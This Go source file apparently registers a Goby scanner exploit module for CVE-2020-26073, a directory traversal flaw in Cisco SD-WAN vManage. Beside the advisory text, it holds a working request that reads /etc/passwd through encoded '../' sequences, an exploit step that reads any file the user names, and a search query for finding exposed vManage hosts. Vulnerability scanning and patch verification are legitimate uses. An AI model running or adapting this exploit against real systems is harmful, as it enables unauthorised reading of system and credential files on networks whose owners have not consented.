package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Cisco SD-WAN vManage Software directory traversal (CVE-2020-26073)",
    "Description": "<p>Cisco SD-WAN vManage Software is a management software for SD-WAN (Software Defined Wide Area Network) solutions from Cisco.</p><p>A directory traversal vulnerability exists in Cisco SD-WAN vManage Software. It allows a remote attacker to read a directory containing sensitive information via the directory traversal character ('. /') to read arbitrary files or restricted directories containing sensitive information.</p>",
    "Product": "Cisco SD-WAN vManage Software",
    "Homepage": "https://www.cisco.com/c/en/us/solutions/enterprise-networks/sd-wan/index.html",
    "DisclosureDate": "2020-09-24",
    "Author": "why_so_serious",
    "FofaQuery": "title=\"Cisco vManage\"",
    "GobyQuery": "title=\"Cisco vManage\"",
    "Level": "2",
    "Impact": "<p>By browsing the directory structure, an attacker may access some hidden files including configuration files, logs, source code, etc. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain higher permissions.</p>",
    "Recommendation": "<p>The vendor has released a fix for the vulnerability, please stay tuned for updates: <a href=\"https://software.cisco.com/download/home/286320995/type\">https://software.cisco.com/download/home/286320995/type</a></p>",
    "References": [
        "https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-vman-traversal-hQh24tmk.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "fileName",
            "type": "input",
            "value": "%2Fetc%2Fpasswd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F{{{fileName}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        "CVE-2020-26073"
    ],
    "CNNVD": [
        "CNNVD-202011-334"
    ],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Cisco SD-WAN vManage Software 目录穿越漏洞（CVE-2020-26073）",
            "Product": "Cisco SD-WAN vManage Software",
            "Description": "<p><span style=\"color: rgb(45, 46, 47); font-size: 14px;\"><span style=\"color: rgb(45, 46, 47); font-size: 14px;\">Cisco SD-WAN vManage Software是美国思科（Cisco）公司的一款用于SD-WAN（软件定义广域网络）解决方案的管理软件。</span></span><br></p><p><span style=\"color: rgb(45, 46, 47); font-size: 14px;\">Cisco SD-WAN vManage Software存在目录遍历漏洞。允许远程攻击者通目录遍历字符（'../'）来读取包含敏感信息的任意文件或受限目录。</span><br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<span style=\"color: rgb(22, 51, 102); font-size: 16px;\"><a href=\"https://software.cisco.com/download/home/286320995/type\">https://software.cisco.com/download/home/286320995/type</a></span><a href=\"https://git.zx2c4.com/cgit/\"></a><a href=\"https://github.com/apache/incubator-shenyu/releases/tag/v2.4.3\"></a></p>",
            "Impact": "<p>攻击者可能通过浏览目录结构，访问到某些隐秘文件包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Cisco SD-WAN vManage Software directory traversal (CVE-2020-26073)",
            "Product": "Cisco SD-WAN vManage Software",
            "Description": "<p>Cisco SD-WAN vManage Software is a management software for SD-WAN (Software Defined Wide Area Network) solutions from Cisco.</p><p>A directory traversal vulnerability exists in Cisco SD-WAN vManage Software. It allows a remote attacker to read a directory containing sensitive information via the directory traversal character ('. /') to read arbitrary files or restricted directories containing sensitive information.</p>",
            "Recommendation": "<p>The vendor has released a fix for the vulnerability, please stay tuned for updates:&nbsp;<a href=\"https://software.cisco.com/download/home/286320995/type\">https://software.cisco.com/download/home/286320995/type</a><br></p>",
            "Impact": "<p>By browsing the directory structure, an attacker may access some hidden files including configuration files, logs, source code, etc. With the comprehensive utilization of other vulnerabilities, the attacker can easily obtain higher permissions.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10666"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}